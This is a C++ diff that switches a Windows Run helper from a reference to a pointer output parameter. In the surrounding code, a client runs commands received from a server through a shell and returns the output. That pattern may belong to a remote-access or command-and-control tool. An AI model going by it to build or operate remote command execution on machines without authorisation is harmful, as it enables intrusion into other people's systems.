@@ -48,7 +48,7 @@ namespace Helper {
         }
     }
 
-    bool Run(const std::wstring& command, const std::wstring& arguments, std::string& output) {
+    bool Run(const std::wstring& command, const std::wstring& arguments, std::string * output) {
         STARTUPINFOW si;
         PROCESS_INFORMATION pi;
         SECURITY_ATTRIBUTES sa;
@@ -115,20 +115,20 @@ namespace Helper {
         DWORD ec;
         if (GetExitCodeProcess(pi.hProcess, &ec)) {
             if (ec == 1) {
-                output = "Error: ";
+                *output = "Error: ";
             } else if (ec == 0) {
-                output = "OK: ";
+                *output = "OK: ";
             }
         } else {
             std::cerr << "Failed to get exit code (" << GetLastError() << ").\n";
-            output = "Error: ";
+            *output = "Error: ";
         }
 
         // Wait for the reader thread to finish
         readerThread.join();
 
         // Append the actual output of the command
-        output += commandOutput;
+        *output += commandOutput;
 
         // Close handles
         CloseHandle(pi.hProcess);
@@ -156,7 +156,7 @@ namespace Helper {
         // If client received a command to excute
         if (exec) {
             std::string output;
-            int status = Run(client->getShell(), to_wstring(client->getServerCommand()), output);
+            int status = Run(client->getShell(), to_wstring(client->getServerCommand()), &output);
             client->setClientResponse(output);
             exit = false;
             
